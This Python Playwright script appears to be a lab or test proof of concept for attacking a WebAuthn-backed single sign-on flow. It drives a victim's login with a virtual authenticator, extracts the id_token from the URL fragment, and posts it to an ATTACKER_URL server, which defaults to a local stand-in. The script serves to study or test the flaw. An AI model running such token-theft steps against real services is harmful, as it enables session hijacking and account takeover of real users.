import os
import time
import asyncio
import httpx
from bs4 import BeautifulSoup
from urllib.parse import urlparse
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError

RP_URL = os.environ.get('RP_URL') or 'http://localhost:4444'
ATTACKER_URL = os.environ.get('ATTACKER_URL') or "http://localhost:6666"

# victim credentials
victim_username = "hoge"
victim_password = "hoge"

async def sso_flow(page):
    await page.goto(f"{RP_URL}/login")

    await page.locator('input[name="userId"]').fill(f'{victim_username}')
    await page.locator('input[name="password"]').fill(f'{victim_password}')
    try:
        # Click login button
        await page.locator('button[type="submit"]').click(timeout=1000)

        # Click continue button
        await page.locator('input[value="Yes"]').click(timeout=1000)
    except PlaywrightTimeoutError:
        print("Timeout!")

    return page

async def main():
    async with async_playwright() as p:
        browser = await p.chromium.launch()
        context = await browser.new_context(ignore_https_errors=True)
        page = await context.new_page()

        # Install virtual authenticator
        cdpSession = await context.new_cdp_session(page)
        await cdpSession.send('WebAuthn.enable')
        await cdpSession.send('WebAuthn.addVirtualAuthenticator', {
            'options': {
                'protocol': 'ctap2',
                'transport': 'internal',
                'automaticPresenceSimulation': True,
                'hasResidentKey': True,
                'hasUserVerification': True,
                'isUserVerified': True,
            }
        })

        # Sign up(victim, victim's browser)
        page = await sso_flow(page)
        await page.click('#registerButton')
        time.sleep(3) # wait 3 seconds

        content = await page.content()
        soup = BeautifulSoup(content, 'html.parser')
        result = soup.find('p', id='content')
        print("sign up result (victim): ", result)
        assert("Sign up succeeded." in result)

        # Sign in(victim, victim's browser)
        page = await sso_flow(page)
        await page.click('#loginButton')
        time.sleep(3) # wait 3 seconds

        content = await page.content()
        soup = BeautifulSoup(content, 'html.parser')
        result = soup.find('p', id='content')
        print("sign in result (victim): ", result)
        assert("Sign in succeeded." in result)
        
        # Get id_token
        fragment = urlparse(page.url).fragment
        id_token = fragment.split("&")[0].split("=")[1]
        print("id_token: ", id_token)

        # Post id_token to attacker server
        async with httpx.AsyncClient() as client:
            res = await client.post(
                f"{ATTACKER_URL}/data/id_token", 
                json={'id_token': id_token}
            )
            print(res.text)
            assert(res.status_code == 200)

if __name__ == "__main__":
    asyncio.run(main())